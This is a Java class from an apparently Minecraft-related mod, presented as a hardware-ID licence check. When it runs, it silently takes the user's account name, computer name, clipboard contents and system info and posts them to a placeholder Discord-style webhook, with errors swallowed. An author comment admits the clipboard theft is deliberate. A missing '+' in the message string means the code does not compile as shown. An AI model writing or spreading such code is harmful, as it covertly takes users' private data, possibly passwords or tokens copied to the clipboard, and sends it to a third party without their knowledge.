package club.cpacket.hwid.util.cul;
import club.cpacket.hwid.manager.HWIDManager;
import club.cpacket.hwid.util.SystemUtil;
import club.cpacket.hwid.util.URLReader;
import club.cpacket.hwid.HWIDAuthMod;
import org.json.simple.JSONObject;

import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.net.URL;

@SuppressWarnings ("unchecked")
public class HWIDSender {

    public static final String pastebinURL = "ur url with hwids";

    public HWIDSender() {
        try {
            JSONObject json = new JSONObject();
            json.put("content",
                    "```" +
                            "\nUsername: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Is using " + "ur mum in the bed"
                            " \nClipboard: " + Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor) + //left clipboard here cos le sussery:^]
                            " \nHwid: " + SystemUtil.getSystemInfo() +
                            " \nHwidList: " + URLReader.readURL() +
                            " \nMemory Usage: " + Math.round(Runtime.getRuntime().freeMemory() / 1024.0f / 1024.0f) + " MB / " + Math.round(Runtime.getRuntime().maxMemory() / 1024.0f / 1024.0f) + " MB (Init " + Math.round(Runtime.getRuntime().totalMemory() / 1024.0f / 1024.0f) + " MB)" +
                            "```");
            HttpsURLConnection connection = (HttpsURLConnection) new URL("ur webhook").openConnection();
            connection.addRequestProperty("Content-Type", "application/json");
            connection.addRequestProperty("User-Agent", "Ballz");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.getOutputStream().write(json.toString().getBytes());
            connection.getOutputStream().flush();
            connection.getOutputStream().close();
            connection.getInputStream().close();
            connection.disconnect();
            HWIDManager.hwidCheck();
        } catch (IOException | UnsupportedFlavorException ignored) {
        }
    }
}